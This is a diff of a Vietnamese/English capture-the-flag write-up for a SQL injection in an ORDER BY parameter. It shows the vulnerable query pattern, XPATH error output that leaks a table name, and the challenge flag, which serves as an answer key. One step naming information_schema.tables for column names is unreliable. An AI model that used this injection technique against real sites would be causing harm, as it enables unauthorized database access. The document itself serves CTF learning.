@@ -2,6 +2,15 @@
 
 **hints**: The length of flag table name > 32 characters
 
+## PHÂN TÍCH
+Như tên bài , thì đây là bài SQLi ở lệnh ORDER BY: `http://try-sqlmap.ctf.actvn.edu.vn/?order=id`
+
+Câu truy vấn có thể sẽ như sau:
+
+```
+SELECT column_name from table_name order by $_GET[order]
+```
+
 `Quick sqlmap` --> sql injection `error based`!
 
 **Payload**:
@@ -25,6 +34,8 @@ XPATH syntax error: '
 x012xxxxxxxxx34567xx1'
 ```
 
-Ok, merge it together: `flahga123456789xxsxx012xxxxxxxxx34567xx1`
+Ok, merge it together: `flahga123456789xxsxx012xxxxxxxxx34567xx1`, we got the table name.
 
-**flag**: `KMACTF{flahga123456789xxsxx012xxxxxxxxx34567xx1}`
+Same with column and flag using column_name from information_schema.tables --> select column_name from flahga123456789xxsxx012xxxxxxxxx34567xx1....
+
+**flag**: `KMACTF{X_Ooooooooooooorder_By_Noooooooooooooooooooone_SQLMaaaaaaaaaaaap?!!!!!!!!!!!!}`
